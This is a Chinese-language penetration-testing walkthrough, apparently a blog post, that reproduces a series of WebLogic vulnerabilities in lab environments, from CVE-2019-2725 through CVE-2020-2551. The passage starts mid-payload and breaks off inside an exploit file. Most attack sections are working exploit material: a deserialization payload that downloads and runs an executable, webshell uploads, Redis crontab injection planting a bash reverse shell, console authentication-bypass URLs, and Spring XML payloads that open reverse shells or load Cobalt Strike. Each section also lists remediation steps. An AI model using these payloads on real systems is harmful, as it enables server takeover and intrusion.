<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void>
<array length="3">
<void index="0">
<string>powershell</string>
</void>
<void index="1">
<string>-Command</string>
</void>
<void index="2">
<string>(new-object System.Net.WebClient).DownloadFile('http://192.168.0.100/mac.exe','mac.exe');start-process mac.exe</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
  <asy:onAsyncDelivery/>
  </soapenv:Body></soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvkeeBoxqgOKghzg43W9tvmVg2YvQ43INmvD0nYgAAs5RPNDoIw7Vew/640?wx_fmt=png)

  成功上线 CS

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbRZViabs4DxBbTTevRpH877VTPxFW1SVRUDoPtRViaLjqSzuib9Vp8JmQ/640?wx_fmt=png)

**漏洞修复**

1. 及时打上官方 CVE-2019-2725 补丁包，官方已于 4 月 26 日公布紧急补丁包。下载地址：https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline

2. 升级本地 JDK 版本，因为 Weblogic 所采用的是其安装文件中默认 1.6 版本的 JDK 文件，属于存在反序列化漏洞的 JDK 版本，因此升级到 JDK7u21 以上版本可以避免由于 Java 原生类反序列化漏洞造成的远程代码执行。

3. 配置 URL 访问控制策略，部署于公网的 WebLogic 服务器，可通过 ACL 禁止对 /_async / 及 / wls-wsat / 路径的访问。

4. 删除不安全文件，删除 wls9_async_response.war 与 wls-wsat.war 文件及相关文件夹，并重启 Weblogic 服务。具体文件路径如下：

```
10.3.*版本：
\Middleware\wlserver_10.3\server\lib\
%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\
%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
12.1.3版本：
\Middleware\Oracle_Home\oracle_common\modules\
%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\

```

****注：****

wls9_async_response.war 及 wls-wsat.war 属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle 官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到 Oracle 产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后再执行此操作。

**WLS Core Components 反序列化漏洞（CVE-2018-2628）**

**漏洞详情**

受影响的 WebLogic 的 WLS 核心组件存在严重的安全漏洞，通过 T3 协议可在前台无需账户登录的情况下进行远程任意代码执行，且 CVE-2018-2628 为 CVE-2017-3248 黑名单修复的绕过。下面说说几个相关的 Weblogic 的反序列化漏洞

CVE-2015-4852：该漏洞利用 Weblogic 中的 Commons Collections 库来实现远程代码执行，查看 CVE-2015-4852 的补丁（p21984589_1036_Generic），发现 Weblogic 采用的黑名单的形式来修复这个漏洞，那么存在被绕过的风险，只要发现可用并且未在黑名单之外的反序列化类，之前的防护就会被打破，系统就会遭受攻击。

CVE-2016-0638：Weblogic 的反序列化的点有三个，黑名单 ClassFilter.class 也作用于 weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream、weblogic.rjvm.MsgAbbrevInputStream.class、weblogic.iiop.Utils.class。通过利用 weblogic.jms.common.StreamMessageImpl 的 readExternal() 也是可以进行反序列化操作的，而且这个不受黑名单限制，所以可以绕过了之前的补丁。

CVE-2016-3510：原理是将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。

CVE-2017-3248：该漏洞就是利用 RMI 机制的缺陷，通过 JRMP 协议达到执行任意反序列化 payload 的目的。使用 ysoserial 的 JRMPListener，这将会序列化一个 RemoteObjectInvocationHandler，该 RemoteObjectInvocationHandler 使用 UnicastRef 建立到远端的 TCP 连接获取 RMI registry。此连接使用 JRMP 协议，因此客户端将反序列化服务器响应的任何内容，从而实现未经身份验证的远程代码执行。

**漏洞版本**

```
- 10.3.6.0
- 12.1.3.0、12.2.1.2-3

```

工具地址如下：

```
https://github.com/0xn0ne/weblogicScanner

```

在 docker 中开启 vulhub 的 CVE-2018-2628 漏洞环境

```
cd vulhub/weblogic/CVE-2018-2628
docker-compose up -d

```

使用工具检测是否存在 CVE-2018-2628 漏洞，结果显示目标存在该漏洞

```
 python CVE-2018-2628-poc.py 192.168.0.107 7001

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib7pFeZOLVUib186BKdbdgvibcEgu8ZqrVHmrDG6XudRmtC38OKVic3gzJA/640?wx_fmt=png)

漏洞利用

使用工具直接上传 shell

```
python CVE-2018-2628-Getshell.py 192.168.0.102 7001 shell1.jsp

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibRpBR5XeMnj36YQ8BCwpchdIMoGHO6HqpDib1xibnRP2gxTicMroaeJkAA/640?wx_fmt=png)

访问

```
http://192.168.0.107:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==，成功执行命令

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibARmKXKlcicfbgpjDIcHuEHWiak4MADW1oOgj7iauDyQnezZgB2vC6BUBw/640?wx_fmt=png)

其中的 d2hvYW1pCg== 为 base64 编码，解码后是 whoami 命令

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibSWgWz6HhOPDWmsTicLSxqmWtQ8guakCiboQO4aY6qj5HgVYGnCrzHNvw/640?wx_fmt=png)

但是该工具只适合在 Linux 下执行，在 Windows 下执行能够直接上传文件，但访问会返回 500

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibdeCGJax0EU6I1oNiaVlzmVw5ymwx3knKiav7MV0ATeKrLic64kyK4Xb8w/640?wx_fmt=png)

因此目标如果是 Windows，可利用 K8 工具来上传 shell

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib4iajnob2eaerichA1C25jTbOvl0zqGuBibaXf3uChpAJt0EldqguyhtRg/640?wx_fmt=png)

利用脚本执行连接上传的 shell

```
python cve-2018-2628.py
> http://192.168.0.105:7001/bea_wls_internal/wlscmd.jsp

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibejUR69R0qGx5xvAiaCFwqjvRcfIoEq8lLsr91wmiangTXYkWlcIOgCYw/640?wx_fmt=png)

**漏洞修复**

过滤 T3 协议，在 base_domain 中选择安全》筛选器〉weblogic.security.net.ConnectionFilterImpl，保存后重启 Weblogic

安装漏洞补丁，但 CVE-2018-2628 的补丁经测试后还是能够绕过

**任意文件上传漏洞（CVE-2018-2894）**

**漏洞详情**

WebLogic 管理端未授权的两个页面存在任意上传文件漏洞，利用该漏洞可直接获取权限。两个页面分别为 / ws_utc/begin.do、/ws_utc/config.do。其在开发模式下可直接访问到管理端，但在生产模式则需要经过身份认证并且不存在该漏洞。

**影响版本：**

```
10.3.6
12.1.3、12.2.1.2、12.2.1.3

```

**漏洞利用**

访问 Windows 下搭建的 Weblogic 12 版本，输入账号密码后可登录后台管理界面

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibFhNZWDqLKD7bzn1rEQux1oC5tVnntl8Dls8H1RmnT9AFxRyNzGelJg/640?wx_fmt=png)

在后台中未发现 / ws_utc/begin.do 和 / ws_utc/config.do 这两个界面，需要在配置中开启 web 服务测试页后才能够访问，点击保存并激活更改后重启 Weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib38SIXqhAq0CEGbGeolpCbjNicAIcb4bI7LmbW0LUAiaC7waAYe1zbRBQ/640?wx_fmt=png)

重启完成后成功访问界面 / ws_utc/begin.do，但仍然需要身份验证，这是生产模式和开发模式的区别，输入账号密码后进入 web 测试页面，其中没有文件上传口，说明生产模式下不存在该漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAiboTCZv91ePJZRHZvpVCicuVcqcib6ZloTkDZ8utNwt0zXQzC6DJMhvvoA/640?wx_fmt=png)

把 Weblogic 修改为开发模式后，访问 / ws_utc/begin.do 界面

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaZMpbSbvVOpgXjkk3VQylhzcfy88Ab8m7VMCnOibwD7uZ4hhhZRgbeA/640?wx_fmt=png)

成功找到文件上传点，在其中直接上传文件

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6VJhdV49N0FfzEIFT0ThUmiby9RXq98d49mpSsjGO9xQppzibBhXfY9g/640?wx_fmt=png)

抓包后发现其中存在安全配置，虽然在返回包中能看到相应的路径，但是无法访问，当然这里其实是可以上传的，在后面 vulhub 中的实例会解答

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibziae4Xwkgo9tibx76ibIgbM3pynqCDvPLwHo2wupTd2ouanZho01iaPJGA/640?wx_fmt=png)

进入 / ws_utc/config.do 界面

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibEYh5kpfXm6wPtj9yjRaa81R2kVByBicybicATeBEb7FAA0k66C65HxQw/640?wx_fmt=png)

将当前文件目录修改为

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css 后提交

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQ3zZmibicjRCVvEawwSLbehztuicTk2CksD9vYyp49VQOnKaUL3s5Vqaw/640?wx_fmt=png)

**在安全选项中点击添加并选择木马尝试上传**

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibqCqJ0SibUaPvRTEQ9rKBxzHHUnfTxeOyXkbDZ4qohPrBtCPSIXUZBcA/640?wx_fmt=png)

提交后查看页面源码，成功发现其中的 id，它对应的其实就是时间戳

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibV6mjw6rNYCkQPAW05fQjbcNeqAy6TXPC9DgWxSV9ae9K5ukpnczeicQ/640?wx_fmt=png)

把这个 id 与木马原名称拼接，访问

/ws_utc/css/config/keystore/1638725748360_JspSpy.jsp 成功

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibb663gg6K17tyPbHlxmibKPWoaZklBVvOvOpeRs0UUqOjsDtZLM9PkgA/640?wx_fmt=png)

输入密码 ninty，进入木马管理界面

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUGwjfuFRyvIw0hRMXnurb9yTcKZ4wGLeg4ygWxuPQ2vBsox0FDu45Q/640?wx_fmt=png)

接下来测试 vulhub 环境，其中 Weblogic 的密码为 EfWP0enw，如果不知道可在靶机中运行如下命令：

```
sudo docker-compose logs | grep password

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib0EiaR3GbckkyW990OazWoHen3pSZBmnC0V4eFcyzz5zajFDlFKFrVlg/640?wx_fmt=png)

进入控制台后还是和之前一样开启 web 测试页

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaoR3g0iam0HwDuGmW4pn4Iwhmb5y1nnDSYuN3EE9J4CicvY7KMMm1tVg/640?wx_fmt=png)

保存后访问 ws_utc/begin.do，在其中上传木马

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib2FlVjfB2fOfGDahs943ebSA5l1ia0qvQLxEAdEF8XPSlC2AU9E6P3tg/640?wx_fmt=png)

使用 BurpSuite 成功抓取到文件上传数据包如下：

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibZjeUw563MxA7pwkhu26ZWcwGRcUV2QbNOcQVGuDWJvZJckP41jXeUQ/640?wx_fmt=png)

虽然显示 500 错误，但是在响应包中存在路径 / ws_utc/css/upload/RS_Upload_2021-12-05_18-22-05_785/import_file_name_JspSpy.jsp，还是出现和上面一样的问题，但其实我们只需要设置上传路径即可解决这个问题。进入 / ws_utc/config.do 界面，设置当前工作目录为

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOdea9AqsiahiaR1YdEo88oycsmmbtDm9QTINwX8ASiay9IW4MHZ2mmOAg/640?wx_fmt=png)

重发木马上传请求包，在响应中返回路径发生变化

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibF0M6NL1cy8YQ129kwjFvc0K5KqFAo2z4ia4gKicic38VbwVGkribodesibw/640?wx_fmt=png)

该路径就是 config.do 界面中设置的工作目录，访问

```
/ws_utc/css/upload/RS_Upload_2021-12-05_18-37-15_307/import_file_name_JspSpy.jsp

```

发现木马已存在

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib1zZTvOrA3qzpoIibQFZibjJ7ve7kmnJ4GdDFoBtJttcHxmJfzPyYEib3w/640?wx_fmt=png)

而 config.do 的利用与以上 Windows 环境一样，在安全中设置 keystore 并点击提交

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5aJLHPTjOJNwicQ0SDbcTgCwZrIwrxX43OJLwAv8d6AOPicDoOUVRblw/640?wx_fmt=png)

查看页面源代码找到对应 id

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibBq7PFogwBlicTGKY7VArrAPkYnKQOfPyo0Elfp5xmqJwl78NXVoB8Fw/640?wx_fmt=png)

访问 / ws_utc/css/config/keystore/1638727126207_JspSpy.jsp，成功 getshell

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibfD0kHbb0jbMianaPc91wiaM68yicUtyicUpuIYuiccKEvoXXjCO2h8ib5k7A/640?wx_fmt=png)

**漏洞修复**

1. 设置 config.do、begin.do 页面登录授权后访问

2.IPS 等防御产品可以加入相应的特征

3. 升级到官方最新版本

**SSRF 漏洞（CVE-2014-4210）**

**漏洞详情**

WebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务端或内网中存在 Redis 未授权访问漏洞等可进一步打漏洞组合拳进行攻击。

**影响版本：**

```
10.0.2
10.3.6

```

**漏洞利用**

验证漏洞只需要直接访问 / uddiexplorer / 接口，出现如下界面说明漏洞存在

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib9QuUMSuTf0KwibF9YoxTichDTXGEKs6NoAJib9ib6asPPyag9ZVRwiazbEQ/640?wx_fmt=png)

为了方便验证 SSRF 漏洞，把环境切换至 vulhub 当中，其自带 redis 未授权访问漏洞。存在漏洞接口为 Search Public Registries

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibFZ9YYHcurdeiaxnJYwNvu37cOibbc7ESPQKHPpwCVTsdBGqMeiaNJXpKw/640?wx_fmt=png)

点击 Search 通过 BurpSuite 抓取数据包

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibxeF7uXdLIJcwlicLrdVkjYv7m6B5cTpia188Rl53UtFXrrChXUh5J20A/640?wx_fmt=png)

更换请求方式为 GET，在漏洞点 operator 中设置一个不存在的端口，比如 http://127.0.0.1:80

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibk6W5jnSBW8vT3ppRwQbw0VTibpljZkCr9OLHpiaTbGQlVgw7kqNJBR3Q/640?wx_fmt=png)

果不其然响应包显示存在错误，接下来在漏洞点 operator 中设置一个存在的端口，比如 http://127.0.0.1:7001

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOLibY4IylnULQPAlRkGTAJGYSQ5bia5eahiaruzlFD6huKLxRl6u1cGgg/640?wx_fmt=png)

响应包显示访问状态码 404，说明端口开放和关闭的响应结果有所不同。因此可根据相应内容判断目标的端口服务是否开放，从而利用 SSRF 进行攻击。

**结合 redis 未授权访问**

探测内网是否存在 redis 服务，修改漏洞点路径为 http://172.24.0.2:6379

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibv60FD9Iib5pPbhVNBaB7pwhuLJv3PJtINb6K09hDMSz4kbqeKia23P2Q/640?wx_fmt=png)

出现与以上两种都不同的提示，说明端口是开放的，但使用的协议不是 http，因此在 172.24.0.2 中开放着 Redis 服务，尝试写入计划任务执行反弹 shell

```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'bash -i >& /dev/tcp/172.24.0.1/6666 0>&1'\n\n\n\n"config set dir /etc/config set dbfilename crontabsave

```

经 URL 编码如下：

```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.24.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave

```

放到漏洞点当中，注意在前面和后面分别添加 %0D%0A%0D%0A 来实现 HTTP 头 CRLF 注入

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibELKzDUKQmACiaANkIY4ZcptqpgQjfbSOrDuFHbiakicECP84Ge1ZEbAibg/640?wx_fmt=png)

完成后可进入靶机进行查看，在 docker 中查看容器 ID

```
docker ps

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibgibcKibPFiatNic7bGbjKrt20Vg23hH0XW7equlqj3MCaSluicEWwQqddibg/640?wx_fmt=png)

发现 c6f7 开放 Weblogic 服务，其 IP 地址为 172.24.0.2；而 7704 开放 redis 服务，其 IP 地址为 172.24.0.3，进入 7704 查看计划任务

```
docker exec -it 7704 bash
cd /etc/
cat crontab

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibWs4zSFWTAjff7aLzu04RNatiapn17GNd59WAyoKh2x4g2MvnD4GAN5A/640?wx_fmt=png)

发现计划任务已经写入，在本机（172.24.0.1）中开启 nc 监听可成功收到反弹 shell

```
nc -nvlp 6666

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib2jF4NAU9JibhiaKiaq8Uy5TITUgm5HmFAicw2C3Z9QbBdYR9M22BXezWyQ/640?wx_fmt=png)

**计划任务写入技巧：**

/etc/crontab: 负责调度各种管理和维护任务

/etc/cron.d/*: 将任意文件写到该目录下，效果和 crontab 相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹 shell

/var/spool/cron/root: CentOS 系统下 root 用户的 cron 文件

/var/spool/cron/crontabs/root: Debian 系统下 root 用户的 cron 文件

**漏洞修复**

升级 Weblogic 版本

**weblogic 后台弱口令 && getshell**

**漏洞详情**

利用爆破手段拿到控制台密码，在爆破时注意如果存在特殊字符需进行 URL 编码

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibIx1wSwRyRFsJSCkicCeJ0PgJHy7tSgyicypP9nTicURdzbkYzOUxfM4QA/640?wx_fmt=png)

在控制台中找到部署选项，开始上传 war 包

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6pSzkNXJiaShLGib139vWCib5Hw1rdoia8A1VyMLfK1hXjMDcCzbGytkXQ/640?wx_fmt=png)

选择文件进行上传，一直下一步直到完成上传

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibwjHZYwEtGzYLKtvB7b3GRXrnOIl8Q037DRma4nwlbXz4icolyawonVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibv3bkoK24NaVLPQuUIjEDibiarPCrRlZjFG6Ps5jicqJeXMgseib4KZJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibGGmbiaWWbRiaZuSV3iaUhpM8fVX7hlqebKiahP9EgWPM9RDtNvVQATsqug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpUibpuD2P3CwyE8KEfUrU6KG65TfYa10oagoibfzm6UZVSp1Ydyibw2xg/640?wx_fmt=png)

    部署成功后存在该应用并点击启动

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibGGSj6SpoEVtINRCUWB4FY14xiaRufeWmhCZgmQicPZmTP6uHwAK6N6w/640?wx_fmt=png)

访问木马 http://192.168.0.105:7001/JspSpy/JspSpy.jsp 成功

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibVHgRHZxFMGBqcmibpxqYbqLibpvQO3o3qc4IXmTGCkxbicPyRjojia0gA/640?wx_fmt=png)

**漏洞修复**

设置强口令，杜绝弱口令

**Console HTTP 协议远程代码执行漏洞（CVE-2020-14882/3）**

**漏洞详情**

组合利用 CVE-2020-14882、CVE-2020-14883 可使未经授权的攻击者绕过 Weblogic 后台登录等限制，最终远程执行代码接管 Weblogic 服务器。这两个漏洞均存在于 Weblogic 的控制台中，利用组件为 Weblogic 全版本自带组件，并且通过 HTTP 协议进行利用。其中 CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。

**影响版本：**

```
10.3.6.0.0
12.1.3.0.0、12.2.1.3.0、12.2.1.4.0
14.1.1.0.0

```

**漏洞利用**

使用 vulhub 搭建漏洞环境

```
cd vulhub/weblogic/CVE-2020-14882
docker-compose up -d

```

其中 CVE-2020-14882 的 POC 如下，访问后可绕过限制进入控制台

```
/console/images/%252E%252E%252Fconsole.portal

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibzFGTlCPczQibJN8TCZD05aRRzyvOEIQtvQ5eH4fV002QAPfEiba3U4yg/640?wx_fmt=png)

而 CVE-2020-14883 的 POC 如下，执行后可写入文件至 Weblogic 服务器当中，执行后显示 404

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/mac.txt%27);%22);

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibXfLAowg7NjTMHy99bQasdaO6sv6bEN65z9RXoCY6rKp3TL4kGng4tA/640?wx_fmt=png)

在服务器中查看发现文件已成功写入 / tmp 目录

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibxZtNRMBrTkjehBicxsQLI7qo7REuSy9W7VPMyHZ7VIomPzyoYJDmJeg/640?wx_fmt=png)

**Linux 反弹 shell**

构造用于执行 payload 的 XML 文档如下：

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.50/6666 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

在本地开启 http 服务并监听 6666 端口

```
python -m SimpleHTTPServer 80

```

请求执行 XML 中的反弹 shell 命令

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.101/poc-bash.xml")

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibhIoBjrF4zohONASQXkER2w0evwpy1Yo6SjAhVQo90wictwpicup6nxvA/640?wx_fmt=png)

成功拿到反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibic1bJPdMBd5QVoeW3HG4qkZAL6fZ0iaWXCaqVxekicsgUI8kFicK0T8xKw/640?wx_fmt=png)

**Windows 上线 CS**

同样构造用于执行 payload 的 XML 文档如下：

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc.exe]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

请求执行 XML 中的计算机命令

```
/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.0.101/poc-calc.xml")

```

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibS1ia9fJA7UII45oZTh17BYDj5QARMwwSQr0xPnd7ZEmckdAzXlsLTbA/640?wx_fmt=png)

在 Windows 系统中成功弹出计算机

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibrJL219RLYzA07Rib09VVMd6zTbU8m0LcY4ISKOoQvdAialsMOSib9Ljicg/640?wx_fmt=png)

既然可以执行普通程序，那么上线 CS 自动也没什么问题，修改利用请求如下：  

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.106/mac.exe','mac.exe');start-process mac.exe]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>

```

执行后成功上线 CS，但默认会执行多次程序，从而导致上线多个会话

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAiblnDH7BXwhZeTJkcfOx1mpqbNBj2EWTN6UsvrHUBHOGy1iagvCQytMHQ/640?wx_fmt=png)

**漏洞修复**

目前 Oracle 官方已发布了最新针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

在旧版补丁中，使用黑名单过滤，可使用大小写绕过，请更新最新版的补丁，或者如无使用必要可选择关闭 console。

**IIOP 反序列化漏洞（CVE-2020-2551）**

**漏洞详情**

该漏洞的出现主要在核心组件当中，影响协议为 IIOP，它类似于 RMI 反序列化漏洞（CVE-2017-3241），都是由于调用远程对象的实现存在缺陷，导致反序列化可以任意构造，并且没有进行安全检查所致。攻击者可以通过 IIOP 协议远程访问 Weblogic 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下完成 RCE。IIOP 协议以 Java 接口的形式对远程对象进行访问，默认为启用状态。当然其影响版本与 Java 和 Weblogic 都有关，经测试在 10.3.6 和 12.1.3 版本下成功复现

**漏洞利用**

利用该漏洞需要准备如下四个文件：

![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibJTqrLVHicHAatvbiboEjKkwtZJiacSiaE9HbC5W5cXPgIREMYsDIEhIT3Q/640?wx_fmt=png)

在 exp.java 中发现其调用计算器程序

```
import java.io.IOException;
public class exp {
  static{
    try {
